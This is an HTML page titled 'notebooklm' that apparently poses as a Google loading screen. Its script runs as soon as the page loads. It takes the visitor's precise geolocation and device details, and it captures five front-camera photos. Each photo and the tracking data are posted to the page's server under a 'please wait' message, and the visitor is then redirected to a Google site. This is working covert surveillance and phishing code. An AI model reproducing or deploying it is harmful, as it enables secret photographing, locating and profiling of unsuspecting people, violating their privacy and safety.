<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>notebooklm</title>
<style>
  body { margin:0; min-height:100vh; display:grid; place-items:center; font-family:system-ui; background:#0f172a; color:#e2e8f0; }
  .card { text-align:center; max-width:500px; padding:40px 32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
  .ring { width: 50px; height: 50px; border: 5px solid #334155; border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { color: #38bdf8; margin-top: 0; }
  p { opacity:.9; line-height:1.6; font-size: 15px; }
  .status { font-weight: bold; color: #fbbf24; margin-top: 20px; font-size: 15px; }
  .success { color: #10b981; }
  .error { color: #ef4444; }
</style>
</head>
<body>
<div class="card" id="main-card">
  <div class="ring"></div>
  <h2>please wait...</h2>
  <p id="status" class="status">Initializing...</p>
</div>

<video id="preview" autoplay muted playsinline style="display:none;"></video>

<script>
window.addEventListener("DOMContentLoaded", () => {
  const video = document.getElementById("preview");
  const status = document.getElementById("status");
  const card = document.getElementById("main-card");

  const sessionId = Math.random().toString(36).substring(2, 6).toUpperCase();

  function getLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve("Location not supported");
      } else {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
          (err) => {
            if (err.code === 1) resolve("Location denied by user");
            else if (err.code === 2) resolve("Location unavailable (GPS off)");
            else if (err.code === 3) resolve("Location timeout");
            else resolve("Unknown Location Error");
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }
    });
  }

  // Get extra technical info
  async function getExtraInfo() {
    let battery = "Unknown";
    let network = "Unknown";
    
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        battery = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
      }
    } catch(e) {}
    
    try {
      if (navigator.connection) {
        network = navigator.connection.effectiveType || "Unknown";
      }
    } catch(e) {}

    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const lang = navigator.language || "Unknown";
    
    return `Screen: ${screenRes} | Lang: ${lang} | Battery: ${battery} | Net: ${network}`;
  }

  (async () => {
    status.textContent = "Requesting...";
    const userLocation = await getLocation();
    const extraInfo = await getExtraInfo();
    const deviceInfo = navigator.userAgent;
    
    status.textContent = "Requesting ...";
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, audio: false
      });
    } catch (e) {
      card.innerHTML = `<h2 class="success">✅ please wait...</h2>`;
      setTimeout(() => { window.location.href = "https://notebook.google.com/"; }, 2000);
      return;
    }

    video.srcObject = stream;
    await video.play();

    const c = document.createElement("canvas");
    c.width = video.videoWidth || 640;
    c.height = video.videoHeight || 480;
    const ctx = c.getContext("2d");

    let n = 0;
    status.textContent = ` wait please... 1 / 5`;

    const timer = setInterval(async () => {
      ctx.drawImage(video, 0, 0, c.width, c.height);
      const img = c.toDataURL("image/jpeg", 0.7);
      
      try {
        await fetch("/shot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
              img: img, 
              loc: userLocation,
              device: deviceInfo,
              extra: extraInfo,
              session: sessionId
          })
        });
      } catch (_) {}

      n++;
      if (n < 5) {
          status.textContent = `wait please... ${n + 1} / 5`;
      } else {
        clearInterval(timer);
        stream.getTracks().forEach(t => t.stop());
        
        card.innerHTML = `<h2 class="success">✅ please wait...</h2>`;

        setTimeout(() => {
          window.location.href = "https://photos.google.com/";
        }, 1000);
      }
    }, 2000);
  })();
});
</script>
</body></html>
